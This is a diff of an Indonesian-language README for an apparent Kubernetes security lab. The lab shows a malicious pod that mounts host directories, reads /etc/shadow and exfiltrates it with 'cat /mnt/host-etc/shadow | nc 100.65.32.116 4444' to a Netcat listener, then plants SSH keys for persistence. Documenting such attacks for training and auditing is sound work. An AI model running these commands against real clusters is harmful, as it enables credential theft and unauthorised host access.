@@ -27,7 +27,7 @@ Pada skenario ini, pod jahat (`skenariol`) dikonfigurasi di namespace `security-
 
 ### Alur Serangan (Data Flow Diagram)
 <p align="center">
-  Assets/langkah1.png
+  <img src="Assets/DFD1.png" width="500" alt="Langkah 1" />
 </p>
 <p>
   <b>Penjelasan DFD:</b> Diagram Alur Data (DFD) menunjukkan alur di mana penyerang mendeploy pod jahat dengan mount direktori host, membaca file kredensial <code>/etc/shadow</code>, mengeksfiltrasi data via Netcat ke Kali Linux, menyisipkan public key SSH ke dalam <code>authorized_keys</code> milik user <code>ubuntu</code>, hingga memperoleh akses persisten langsung ke sistem host via SSH.
@@ -45,18 +45,21 @@ Pada skenario ini, pod jahat (`skenariol`) dikonfigurasi di namespace `security-
   <b>Penjelasan gambar diatas:</b> Pembuatan namespace <code>security-audit-lab</code> dan penyiapan manifes pod <code>skenariol</code> berbasis <code>alpine:latest</code> dengan mount point <code>hostPath</code> yang mengarahkan <code>/etc</code> ke <code>/mnt/host-etc</code>, <code>/var</code> ke <code>/mnt/host-var</code>, dan <code>/home</code> ke <code>/mnt/host-home</code>.
 </p>
 
-<p>
-  <img width="512" alt="Akses File Sensitif" src="https://github.com/user-attachments/assets/8fc315fc-e656-4faf-8e66-443a85a7d326" />
+<p align="center">
+  <img src="Assets/langkah3.png" width="500" alt="Langkah 3" />
 </p>
 <p>
   <b>Penjelasan gambar diatas:</b> Penyerang mengeksekusi shell ke dalam pod menggunakan <code>kubectl exec -it skenariol -n security-audit-lab sh</code> dan mengakses isi file <code>/mnt/host-etc/shadow</code> untuk mengintip hash password akun sistem host.
 </p>
 
-![Pembukaan Port Listener Netcat](https://github.com/user-attachments/assets/LINK_GAMBAR_NETCAT_LISTENER)
-*Penjelasan gambar diatas:* Penyerang membuka listener jaringan dengan perintah `nc -tvnp 4444` pada mesin Kali Linux (`100.65.32.116`) untuk mendengarkan koneksi data masuk dari pod[cite: 1].
+<p align="center">
+  <img src="Assets/langkah4.png" width="500" alt="Langkah 4" />
+</p>
+  <b>Penjelasan gambar diatas:</b> Penyerang membuka listener jaringan dengan perintah `nc -tvnp 4444` pada mesin Kali Linux (`100.65.32.116`) untuk mendengarkan koneksi data masuk dari pod[cite: 1].
 
-![Hasil Eksfiltrasi Data Kredensial](https://github.com/user-attachments/assets/LINK_GAMBAR_EKSFILTRASI_SUCCESS)
-*Penjelasan gambar diatas:* Dari dalam pod di Ubuntu Server, penyerang mengirimkan data sensitif menggunakan perintah `cat /mnt/host-etc/shadow | nc 100.65.32.116 4444`, sehingga hash password sistem host berhasil dieksfiltrasi ke mesin penyerang[cite: 1].
+<p align="center">
+  <img src="Assets/langkah5.png" width="500" alt="Langkah 5" />
+</p><b>Penjelasan gambar diatas:</b> Dari dalam pod di Ubuntu Server, penyerang mengirimkan data sensitif menggunakan perintah `cat /mnt/host-etc/shadow | nc 100.65.32.116 4444`, sehingga hash password sistem host berhasil dieksfiltrasi ke mesin penyerang.
 
 ### Tahapan Injeksi Kunci SSH & Akses Persisten
 
